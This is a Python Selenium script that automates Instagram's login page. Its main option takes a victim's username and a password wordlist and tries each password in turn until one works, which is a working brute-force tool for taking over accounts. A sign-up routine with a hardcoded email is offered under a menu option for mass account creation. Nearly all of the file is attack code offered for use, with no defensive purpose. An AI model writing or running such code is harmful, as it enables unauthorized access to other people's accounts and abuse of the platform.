from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from time import sleep
import csv
import os
import sys



class instaBot():
    def __init__(self):
        #open chrome
        option = webdriver.ChromeOptions()
        option.add_argument('--ignore-certificate-errors')

        #path to the chrome driver 
        chromePath = 'G:\drive_D\Python\chromeDriver\chromedriver.exe'
        self.driver = webdriver.Chrome(chromePath,chrome_options=option)


                         
    def pageLoad(self,xpath):

        timeout = 20
        try:
            element_present = EC.presence_of_element_located((By.CLASS_NAME, xpath))
            WebDriverWait(self.driver, timeout).until(element_present)
        except TimeoutException:
            print ("Timed out waiting for page to load")

    def login(self,username,password):
        login_url = 'https://www.instagram.com/accounts/login/?source=auth_switcher'
        self.driver.get(login_url)
        self.driver.implicitly_wait(5)
        
        timeout = 20
        try:
            element_present = EC.presence_of_element_located((By.NAME, "username"))
            WebDriverWait(self.driver, timeout).until(element_present)
        except TimeoutException:
            print ("Timed out waiting for page to load")

        username_el = self.driver.find_element_by_name("username")
        usernameAddress = username
        username_el.send_keys(usernameAddress)
        
        password_el = self.driver.find_element_by_name("password")
        passwordAddress = password
        password_el.send_keys(passwordAddress)

        signin_btn = self.driver.find_element_by_xpath("//*[contains(text(), 'Log In')]")
        signin_btn.click()

        self.driver.implicitly_wait(2)


        timeout = 2
        try:
            element_present = EC.visibility_of_element_located((By.XPATH, "//*[contains(text(), 'Sorry, your password was incorrect. Please double-check your password.')]"))
            WebDriverWait(self.driver, timeout).until(element_present)
            return False
        except TimeoutException:
            print ("Timed out waiting for page to load or find pass word : " + passwordAddress)
            return passwordAddress
        

    def sign_up(self):

        self.driver.get('https://www.instagram.com/accounts/emailsignup/')

        email = self.driver.find_element_by_name("emailOrPhone")
        emailAddress = "aamm98765@gmail.com"
        email.send_keys(emailAddress)

        full_Name = self.driver.find_element_by_name("fullName")
        full_NameAddress = "aamm98765@gmail.com"
        full_Name.send_keys(full_NameAddress)

        username = self.driver.find_element_by_name("username")
        username_Address = "aamm98765"
        username.send_keys(username_Address)

        password = self.driver.find_element_by_name("password")
        password_Address = "aamm98765@gmail.com"
        password.send_keys(password_Address)
        
        self.driver.implicitly_wait(2)

        try:
            if(self.driver.find_element_by_class_name("coreSpriteInputRefresh")):
                refresh = self.driver.find_element_by_class_name("coreSpriteInputRefresh")
        except:
            print("refresh fals")
        
        sign_up_btn = self.driver.find_element_by_xpath("//button[contains(text(), 'Sign up')]")
        sign_up_btn.click()

        print("clicked s")

    def check_for_passwords(self,username,password_List):
        counter = 0
        for password in password_List:
            os.system('cls' if os.name=='nt' else 'clear')
            counter += 1
            print(counter)
            result = self.login(username,password)
            if(result != False):
                final_result = "Password Found : " + result
                return final_result
        return "Password NOT Found"
    

    def create_password_list(self,file_path):

        result = []

        
        try:
            file = open(file_path,'r',encoding='utf-8')
            lines = file.readlines()
        except:
            print("Error in opening file")
            sys.exit()

                
        for x in lines:
            x =  x.strip()
            if(len(x) > 2):
                result.append(x)
        return result


def create_Account():
        os.system('cls' if os.name=='nt' else 'clear')
        print('this feature is not avalable right now')
        print("1")

def hack_with_worldList():
    os.system('cls' if os.name=='nt' else 'clear')

    print('please enter username or email or phone number :')
    username = input()
    print('please enter full password list file path :')
    path = input()
    i = instaBot()
    result = i.check_for_passwords(username,i.create_password_list(path))
    print(result)
    print("2")


print("please select the option : ")
print("1 : create massive instagram account ")
print('2 : login with password world list')
print('exit : to exit the program')

while(True):
    first_Select =  input()

    if(first_Select == "1"):
        create_Account()
        break

    elif(first_Select == "2"):
        hack_with_worldList()
        break

    elif(first_Select == "3"):
        break
    
    elif(first_Select == "exit"):
        sys.exit()

    else:
        print("invalid input")


